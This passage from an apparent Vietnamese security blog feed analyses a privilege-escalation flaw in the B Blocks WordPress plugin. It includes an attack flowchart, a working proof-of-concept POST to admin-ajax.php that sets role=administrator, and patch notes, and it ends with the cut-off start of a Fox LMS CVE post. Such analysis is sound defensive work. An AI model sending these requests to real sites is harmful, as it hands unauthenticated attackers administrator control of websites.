to√†n b·ªô d·ªØ li·ªáu ƒëƒÉng k√Ω do client g·ª≠i l√™n, r·ªìi t·∫°o user tr·ª±c ti·∫øp trong WordPress. Tuy nhi√™n &lt;strong&gt;kh√¥ng c√≥ c∆° ch·∫ø ki·ªÉm so√°t ph√¢n quy·ªÅn (authorization)&lt;/strong&gt; v√† &lt;strong&gt;kh√¥ng c√≥ ki·ªÉm tra / r√†ng bu·ªôc gi√° tr·ªã role ƒë·∫ßu v√†o (input validation)&lt;/strong&gt;, d·∫´n ƒë·∫øn vi·ªác &lt;strong&gt;client c√≥ th·ªÉ t·ª± √Ω ch·ªâ ƒë·ªãnh role&lt;/strong&gt; khi g·ª≠i request. ƒêi·ªÅu n√†y t·∫°o ƒëi·ªÅu ki·ªán cho &lt;strong&gt;ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c (unauthenticated user)&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;t·∫°o t√†i kho·∫£n m·ªõi v·ªõi quy·ªÅn qu·∫£n tr·ªã (administrator)&lt;/strong&gt;, g√¢y ra &lt;strong&gt;l·ªó h·ªïng n√¢ng cao ƒë·∫∑c quy·ªÅn (Privilege Escalation)&lt;/strong&gt; nghi√™m tr·ªçng.&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n, ƒëi·ªÅu ki·ªán ti√™n quy·∫øt ƒë·ªÉ vi·ªác ƒëƒÉng k√Ω user m·ªõi x·∫£y ra su√¥n s·∫ª l√† ph·∫£i v∆∞·ª£t qua b∆∞·ªõc ki·ªÉm tra nonce:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$nonce = sanitize_text_field($_POST[&amp;#39;nonce&amp;#39;]);&#xA;&#xA;if(!wp_verify_nonce($nonce, &amp;#39;wp_ajax&amp;#39;)){&#xA;    wp_send_json_error(&amp;#39;invalid request&amp;#39;);&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m th·ª±c hi·ªán ki·ªÉm tra nonce v·ªõi action l√† &lt;code&gt;wp_ajax&lt;/code&gt;. Khi t√¨m ki·∫øm v·ªõi t·ª´ kh√≥a &lt;code&gt;wp_ajax&lt;/code&gt;, c√≥ th·ªÉ th·∫•y nonce ƒë∆∞·ª£c t·∫°o ra khi hai block &lt;strong&gt;&lt;code&gt;LoginForm&lt;/code&gt;&lt;/strong&gt; ho·∫∑c &lt;strong&gt;&lt;code&gt;Countdown&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c th√™m v√†o post/page.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/nonce.png&#34; title=&#34;Create nonce&#34; data-thumbnail=&#34;/posts/2026-01-11-cve-2025-8059/nonce.png&#34; data-sub-html=&#34;&lt;h2&gt;Create nonce&lt;/h2&gt;&lt;p&gt;Create nonce&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-11-cve-2025-8059/nonce.png&#39; alt=&#34;Create nonce&#34; height=&#34;337&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Create nonce&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Tuy nhi√™n, block &lt;strong&gt;&lt;code&gt;LoginForm&lt;/code&gt;&lt;/strong&gt; ch·ªâ xu·∫•t hi·ªán trong ch·∫ø ƒë·ªô &lt;strong&gt;Dev&lt;/strong&gt; n√™n kh√¥ng c√≥ c√°ch n√†o ƒë·ªÉ ng∆∞·ªùi d√πng th√¥ng th∆∞·ªùng t·∫°o ƒë∆∞·ª£c nonce th√¥ng qua block n√†y.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/login.png&#34; title=&#34;LoginForm&#34; data-thumbnail=&#34;/posts/2026-01-11-cve-2025-8059/login.png&#34; data-sub-html=&#34;&lt;h2&gt;Login&lt;/h2&gt;&lt;p&gt;LoginForm&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-11-cve-2025-8059/login.png&#39; alt=&#34;Login&#34; height=&#34;691&#34; width=&#34;1726&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;LoginForm&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Nh∆∞ v·∫≠y, ta ch·ªâ c√≥ th·ªÉ khai th√°c d·ª±a tr√™n block &lt;strong&gt;&lt;code&gt;Countdown&lt;/code&gt;&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/countdown.png&#34; title=&#34;Countdown&#34; data-thumbnail=&#34;/posts/2026-01-11-cve-2025-8059/countdown.png&#34; data-sub-html=&#34;&lt;h2&gt;Countdown&lt;/h2&gt;&lt;p&gt;Countdown&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-11-cve-2025-8059/countdown.png&#39; alt=&#34;Countdown&#34; height=&#34;801&#34; width=&#34;1503&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Countdown&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Khi truy c·∫≠p v√†o post/page c√≥ ch·ª©a block &lt;strong&gt;&lt;code&gt;Countdown&lt;/code&gt;&lt;/strong&gt;, trong response HTML s·∫Ω xu·∫•t hi·ªán nonce ƒë∆∞·ª£c render ra ph√≠a client. K·∫ª t·∫•n c√¥ng ch·ªâ c·∫ßn m·ªü &lt;strong&gt;View Source&lt;/strong&gt; ho·∫∑c &lt;strong&gt;DevTools ‚Üí Network ‚Üí Response&lt;/strong&gt; ƒë·ªÉ tr√≠ch xu·∫•t gi√° tr·ªã nonce n√†y.&lt;/p&gt;&#xA;&lt;p&gt;Sau khi c√≥ nonce h·ª£p l·ªá, attacker c√≥ th·ªÉ g·ª≠i m·ªôt request th·ªß c√¥ng t·ªõi endpoint AJAX c·ªßa WordPress, k√®m theo nonce v√† c√°c tham s·ªë ƒëƒÉng k√Ω, ƒë·∫∑c bi·ªát l√† tr∆∞·ªùng &lt;strong&gt;&lt;code&gt;role=administrator&lt;/code&gt;&lt;/strong&gt;. Do ph√≠a server &lt;strong&gt;kh√¥ng ki·ªÉm tra ph√¢n quy·ªÅn&lt;/strong&gt; v√† &lt;strong&gt;tin t∆∞·ªüng d·ªØ li·ªáu ƒë·∫ßu v√†o&lt;/strong&gt;, request s·∫Ω ƒë∆∞·ª£c ch·∫•p nh·∫≠n v√† t√†i kho·∫£n m·ªõi s·∫Ω ƒë∆∞·ª£c t·∫°o v·ªõi &lt;strong&gt;quy·ªÅn qu·∫£n tr·ªã vi√™n&lt;/strong&gt;, ho√†n t·∫•t qu√° tr√¨nh khai th√°c l·ªó h·ªïng.&lt;/p&gt;&#xA;&lt;p&gt;B·∫£n v√° &lt;strong&gt;&lt;code&gt;v2.0.7&lt;/code&gt;&lt;/strong&gt; ƒë√£ &lt;strong&gt;x√≥a b·ªè file &lt;code&gt;RegisterForm.php&lt;/code&gt;&lt;/strong&gt;, ƒë·ªìng th·ªùi lo·∫°i b·ªè ho√†n to√†n action hook &lt;strong&gt;&lt;code&gt;wp_ajax_nopriv_rgfr_registration&lt;/code&gt;&lt;/strong&gt;, khi·∫øn endpoint ƒëƒÉng k√Ω kh√¥ng c√≤n ƒë∆∞·ª£c public cho ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p. Vi·ªác n√†y ch·∫∑n tr·ª±c ti·∫øp kh·∫£ nƒÉng g·ªçi h√†m &lt;strong&gt;&lt;code&gt;rgfr_registration()&lt;/code&gt;&lt;/strong&gt; t·ª´ b√™n ngo√†i, qua ƒë√≥ lo·∫°i b·ªè vector t·∫•n c√¥ng cho ph√©p t·∫°o t√†i kho·∫£n tr√°i ph√©p v√† t·ª± g√°n quy·ªÅn qu·∫£n tr·ªã.&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/patch.png&#34; title=&#34;Patch&#34; data-thumbnail=&#34;/posts/2026-01-11-cve-2025-8059/patch.png&#34; data-sub-html=&#34;&lt;h2&gt;Patch&lt;/h2&gt;&lt;p&gt;Patch&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-11-cve-2025-8059/patch.png&#39; alt=&#34;Patch&#34; height=&#34;501&#34; width=&#34;1919&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Patch&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;flowchart TD&#xA;A[&amp;#34;Attacker (Unauthenticated)&amp;#34;]&#xA;--&amp;gt; B[&amp;#34;Access a post/page containing the Countdown block&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Extract nonce from HTML response or DevTools ‚Üí Network&amp;#34;]&#xA;&#xA;C --&amp;gt; D[&amp;#34;Prepare POST request to /wp-admin/admin-ajax.php?action=rgfr_registration&amp;#34;]&#xA;&#xA;D --&amp;gt; E[&amp;#34;Attach extracted nonce and registration parameters&amp;#34;]&#xA;&#xA;E --&amp;gt; F[&amp;#34;Set role=administrator in request payload&amp;#34;]&#xA;&#xA;F --&amp;gt; G[&amp;#34;Request reaches wp_ajax_nopriv_rgfr_registration action hook&amp;#34;]&#xA;&#xA;G --&amp;gt; H[&amp;#34;rgfr_registration() verifies nonce only (no authorization check)&amp;#34;]&#xA;&#xA;H --&amp;gt; I[&amp;#34;User input is accepted without role validation&amp;#34;]&#xA;&#xA;I --&amp;gt; J[&amp;#34;wp_create_user() creates a new user account&amp;#34;]&#xA;&#xA;J --&amp;gt; K[&amp;#34;wp_update_user() assigns attacker-controlled role&amp;#34;]&#xA;&#xA;K --&amp;gt; L[&amp;#34;New user account is created with Administrator role&amp;#34;]&#xA;&#xA;L --&amp;gt; M[&amp;#34;Attacker logs in with newly created account&amp;#34;]&#xA;&#xA;M --&amp;gt; N[&amp;#34;Full administrative privileges obtained&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;Truy c·∫≠p v√†o post/page c√≥ ch·ª©a block &lt;strong&gt;&lt;code&gt;Countdown&lt;/code&gt;&lt;/strong&gt; v√† tr√≠ch xu·∫•t &lt;strong&gt;nonce&lt;/strong&gt; t·ª´ response tr·∫£ v·ªÅ (View Source ho·∫∑c DevTools ‚Üí Network).&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;G·ª≠i request t·ªõi endpoint &lt;strong&gt;&lt;code&gt;/wp-admin/admin-ajax.php&lt;/code&gt;&lt;/strong&gt; v·ªõi action &lt;strong&gt;&lt;code&gt;rgfr_registration&lt;/code&gt;&lt;/strong&gt;, k√®m theo nonce v·ª´a l·∫•y ƒë∆∞·ª£c v√† thi·∫øt l·∫≠p tham s·ªë &lt;strong&gt;&lt;code&gt;role=administrator&lt;/code&gt;&lt;/strong&gt; ƒë·ªÉ t·∫°o t√†i kho·∫£n v·ªõi quy·ªÅn qu·∫£n tr·ªã.&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;POST /wp-admin/admin-ajax.php HTTP/1.1&#xA;Host: localhost&#xA;&#xA;action=rgfr_registration&amp;amp;nonce=nonce_value&amp;amp;username=hacker&amp;amp;email=hacker@gmail.com&amp;amp;password=hacker&amp;amp;confirmpassword=hacker&amp;amp;firstname=hacker&amp;amp;role=administrator&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2026-01-11-cve-2025-8059/result.png&#34; title=&#34;Result&#34; data-thumbnail=&#34;/posts/2026-01-11-cve-2025-8059/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;Result&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2026-01-11-cve-2025-8059/result.png&#39; alt=&#34;Result&#34; height=&#34;772&#34; width=&#34;1542&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;Result&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Login v·ªõi user v·ª´a t·∫°o&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong plugin &lt;strong&gt;B Blocks&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;2.0.6&lt;/strong&gt; xu·∫•t ph√°t t·ª´ vi·ªác endpoint AJAX &lt;strong&gt;&lt;code&gt;rgfr_registration&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c public cho ng∆∞·ªùi d√πng ch∆∞a ƒëƒÉng nh·∫≠p, trong khi ph√≠a server &lt;strong&gt;ch·ªâ ki·ªÉm tra nonce m√† kh√¥ng th·ª±c hi·ªán ki·ªÉm so√°t ph√¢n quy·ªÅn (authorization)&lt;/strong&gt; v√† &lt;strong&gt;kh√¥ng r√†ng bu·ªôc gi√° tr·ªã role ƒë·∫ßu v√†o (input validation)&lt;/strong&gt;. Nonce c√≥ th·ªÉ ƒë∆∞·ª£c thu th·∫≠p d·ªÖ d√†ng th√¥ng qua block &lt;strong&gt;&lt;code&gt;Countdown&lt;/code&gt;&lt;/strong&gt;, cho ph√©p k·∫ª t·∫•n c√¥ng g·ª≠i request t√πy √Ω v√† t·ª± g√°n &lt;strong&gt;&lt;code&gt;role=administrator&lt;/code&gt;&lt;/strong&gt; khi ƒëƒÉng k√Ω t√†i kho·∫£n m·ªõi. K·∫øt qu·∫£ l√† attacker c√≥ th·ªÉ t·∫°o t√†i kho·∫£n v·ªõi &lt;strong&gt;quy·ªÅn qu·∫£n tr·ªã vi√™n&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;n√¢ng cao ƒë·∫∑c quy·ªÅn to√†n h·ªá th·ªëng&lt;/strong&gt;, g√¢y r·ªßi ro nghi√™m tr·ªçng cho t√≠nh to√†n v·∫πn v√† b·∫£o m·∫≠t c·ªßa website.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nonce kh√¥ng ph·∫£i l√† c∆° ch·∫ø ph√¢n quy·ªÅn&lt;/strong&gt;: Nonce ch·ªâ gi√∫p ch·ªëng CSRF, kh√¥ng th·ªÉ thay th·∫ø cho vi·ªác ki·ªÉm tra quy·ªÅn truy c·∫≠p ho·∫∑c x√°c th·ª±c ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng bao gi·ªù tin t∆∞·ªüng d·ªØ li·ªáu t·ª´ client&lt;/strong&gt;: C√°c tham s·ªë nh·∫°y c·∫£m nh∆∞ &lt;strong&gt;role&lt;/strong&gt;, &lt;strong&gt;capability&lt;/strong&gt; ph·∫£i ƒë∆∞·ª£c ki·ªÉm so√°t ph√≠a server ho·∫∑c whitelist ch·∫∑t ch·∫Ω.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Endpoint public c·∫ßn ki·ªÉm so√°t r·ªßi ro nghi√™m ng·∫∑t&lt;/strong&gt;: C√°c hook d·∫°ng &lt;strong&gt;&lt;code&gt;wp_ajax_nopriv_*&lt;/code&gt;&lt;/strong&gt; ph·∫£i ƒë∆∞·ª£c thi·∫øt k·∫ø c·∫©n th·∫≠n v√¨ c√≥ th·ªÉ b·ªã truy c·∫≠p b·ªüi b·∫•t k·ª≥ ai.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Validate v√† sanitize l√† hai kh√°i ni·ªám kh√°c nhau&lt;/strong&gt;: Sanitize ch·ªâ l√†m s·∫°ch d·ªØ li·ªáu, kh√¥ng ƒë·∫£m b·∫£o d·ªØ li·ªáu h·ª£p l·ªá v·ªÅ m·∫∑t logic v√† b·∫£o m·∫≠t.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/privilege-escalation/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Privilege Escalation&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/b-blocks/vulnerability/wordpress-b-blocks-plugin-2-0-6-missing-authorization-to-unauthenticated-privilege-escalation-via-rgfr-registration-function-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress B Blocks Plugin 2.0.6 is vulnerable to a high priority Privilege Escalation&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2563 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/</link>
      <pubDate>Thu, 08 Jan 2026 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2026-01-08-cve-2025-14156/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2026-01-08-cve-2025-14156/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;The Fox LMS ‚Äì WordPress LMS Plugin&lt;/strong&gt; d√†nh cho &lt;strong&gt;WordPress&lt;/strong&gt; t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;leo thang ƒë·∫∑c quy·ªÅn&lt;/strong&gt; trong t·∫•t c·∫£ c√°c &lt;strong&gt;phi√™n b·∫£n ƒë·∫øn v√† bao g·ªìm 1.0.5.1&lt;/strong&gt;. Nguy√™n nh√¢n l√† do plugin &lt;strong&gt;kh√¥ng ki·ªÉm tra v√† x√°c th·ª±c ƒë√∫ng tham s·ªë ‚Äúrole‚Äù&lt;/strong&gt; khi &lt;strong&gt;t·∫°o ng∆∞·ªùi d√πng m·ªõi&lt;/strong&gt; th√¥ng qua &lt;strong&gt;REST API endpoint &lt;code&gt;/fox-lms/v1/payments/create-order&lt;/code&gt;&lt;/strong&gt;. ƒêi·ªÅu n√†y cho ph√©p &lt;strong&gt;k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c&lt;/strong&gt; c√≥ th·ªÉ &lt;strong&gt;t·∫°o t√†i kho·∫£n ng∆∞·ªùi d√πng m·ªõi v·ªõi b·∫•t k·ª≥ vai tr√≤ n√†o, bao g·ªìm c·∫£ qu·∫£n tr·ªã vi√™n&lt;/strong&gt;, d·∫´n ƒë·∫øn &lt;strong&gt;to√†n b·ªô website c√≥ th·ªÉ b·ªã chi·∫øm quy·ªÅn ki·ªÉm so√°t&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2563&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2563&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Privilege Escalation&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: 1.0.4.7-1.0.5.1&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.0.5.2&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/fox-lms/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Fox LMS Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; 